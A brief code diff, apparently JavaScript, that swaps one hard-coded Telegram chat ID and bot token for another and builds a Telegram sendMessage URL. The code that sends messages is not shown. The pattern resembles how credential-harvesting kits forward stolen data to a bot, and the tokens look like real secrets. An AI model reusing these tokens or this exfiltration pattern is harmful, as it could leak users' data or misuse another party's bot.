@@ -13,8 +13,8 @@
          });
        });
 
-       const chat_id = '6743472561',
-         botID = 'bot7714679923%3AAAEkJ0Akl-OzdOOFzEP5UoIehrW5dwVSnMA';
+       const chat_id = '7661759276',
+         botID = 'bot7703073974%253AAAGBV10soyX5rY9Ea88ZAaMWJ_mzMSDABT0';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
